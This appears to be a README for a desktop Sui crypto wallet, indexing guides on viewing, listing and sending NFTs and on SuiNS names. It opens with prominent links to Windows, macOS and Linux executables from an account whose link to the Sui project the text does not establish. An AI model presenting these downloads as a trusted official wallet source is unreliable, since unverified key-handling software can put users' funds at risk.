![SUI Wallet](assets/banner-hub.png)

# SUI Wallet NFT marketplace

List, hold and transfer Sui objects from a desktop wallet that keeps the keys on your machine.

[![License: Apache-2.0](https://img.shields.io/badge/LICENSE-Apache--2.0-4DA2FF?style=for-the-badge&labelColor=0D1117)](#license)

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

## What this repository is for

On Sui an NFT is an owned object rather than a row in a contract's table, and that single difference changes what a marketplace listing is. The object moves to a contract while the listing is open, and it comes back to your account if the listing is not taken. A reader who has used a marketplace on another chain will find the flow familiar and the mechanics different.

This repository is the project's home for that flow. It collects the pages about seeing what an account owns, sending an object to another address, and putting one up for sale, plus the background a reader needs on why an object can disappear from a list without leaving the chain: a different account is selected, a marketplace holds it, or the wallet has not refreshed.

It also covers the part of object custody that gets less attention than trading: names. A SuiNS name is an object too, it resolves to an address, and whether a form accepts it in place of an address is a property of the form rather than of the wallet.

Every page assumes a working SUI Wallet with a recorded recovery phrase. Where a step depends on one of those, the page links the guide that covers it rather than repeating an install or a backup in a second place, so a correction lands in one file instead of four.

## Who it is for

- A collector who has objects on Sui and needs to list one for sale without moving it to a custodial venue.
- Someone whose NFT is missing from the wallet list and wants to know whether it left the account.
- A reader setting up a SuiNS name and unsure what it resolves to.

## Start here

1. [Viewing NFTs in SUI Wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/viewing-nfts-in-sui-wallet.md) - Sui objects show up as objects; a missing one is usually a different account.
2. [Listing an NFT on the Sui marketplace](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/listing-an-nft-on-the-sui-marketplace.md) - A listing is a transaction that hands the object to a marketplace contract.
3. [Sending NFTs from SUI Wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/sending-nfts-from-sui-wallet.md) - An NFT transfer is a transaction like any other, with the object as its payload.
4. [SUI Wallet and SuiNS names](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/sui-wallet-suins-names-explained.md) - A SuiNS name points at an address; the address still does the work.

## How to use these guides

1. Select the account that holds the objects before opening any list. A wallet with several addresses shows only the selected one, which is the commonest reason an NFT looks missing.
2. Send an object to another address only after reading the object id in the preview, since a transaction moves the object itself rather than a quantity of a balance.
3. When you list something, note the digest. The marketplace holds the object while the sale is open, and that digest is how you follow where it went.
4. Treat a SuiNS name as a pointer rather than a replacement for the address, and keep the address to hand wherever a form asks for it.

## The guides grouped

| Guide | What it answers |
| --- | --- |
| [Viewing NFTs in SUI Wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/viewing-nfts-in-sui-wallet.md) | Find the NFT objects held by an account and understand why some do not appear in the list. |
| [Listing an NFT on the Sui marketplace](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/listing-an-nft-on-the-sui-marketplace.md) | List a Sui NFT for sale and understand what the marketplace contract holds while the listing is open. |
| [Sending NFTs from SUI Wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/sending-nfts-from-sui-wallet.md) | Transfer a Sui NFT object to another address and confirm the object left the sending account. |
| [SUI Wallet and SuiNS names](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/sui-wallet-suins-names-explained.md) | Explain what a SuiNS name resolves to and when a wallet will accept one in place of an address. |

## What each guide changes

| Task | Guide | Outcome |
| --- | --- | --- |
| Sui objects show up as objects; a missing one is usually a different account. | [Viewing NFTs in SUI Wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/viewing-nfts-in-sui-wallet.md) | Find the NFT objects held by an account and understand why some do not appear in the list. |
| A listing is a transaction that hands the object to a marketplace contract. | [Listing an NFT on the Sui marketplace](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/listing-an-nft-on-the-sui-marketplace.md) | List a Sui NFT for sale and understand what the marketplace contract holds while the listing is open. |
| An NFT transfer is a transaction like any other | [Sending NFTs from SUI Wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/sending-nfts-from-sui-wallet.md) | Transfer a Sui NFT object to another address and confirm the object left the sending account. |
| A SuiNS name points at an address; the address still does the work. | [SUI Wallet and SuiNS names](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/sui-wallet-suins-names-explained.md) | Explain what a SuiNS name resolves to and when a wallet will accept one in place of an address. |

## Common first questions

### Why is an NFT I own not in the list?

Usually the selected account is not the one holding it, and occasionally the marketplace holds the object while a listing is open. Both are checkable without moving anything.

### Does listing an NFT give the marketplace my key?

No. You sign one transaction that hands the object to a contract, and the key stays on your machine. What changes is who holds the object, not who holds the account.

### Can a SuiNS name replace my address when receiving?

Only where the form resolves names. A name points at an address, and a field that expects the address will not always accept the name, so keep the address to hand.

## Before you start

Decide which account should own the object before you send or list it, since a transfer to the wrong address cannot be undone. An object moved to a marketplace leaves your list until the sale closes or is cancelled.

## About

This repository belongs to the same account as the desktop application and the other guide sets: [install and repair](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting), [keys and login](https://github.com/sui-blockchain-wallet/key-safety-and-login), [transfers and staking](https://github.com/sui-blockchain-wallet/onchain-transfer-guides) and [the bridge](https://github.com/sui-blockchain-wallet/evm-sui), with [the profile repository](https://github.com/sui-blockchain-wallet) as the index. The wallet is actively maintained and the release page is its only distribution channel.

## License

Apache License 2.0. The full text sits in the application repository's [licence file](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/blob/HEAD/LICENSE) and a copy ships at the root of this repository.

---

SUI Wallet is a self-custody desktop wallet for Sui. A listing moves an object rather than a key, and nothing on this page values a collection.
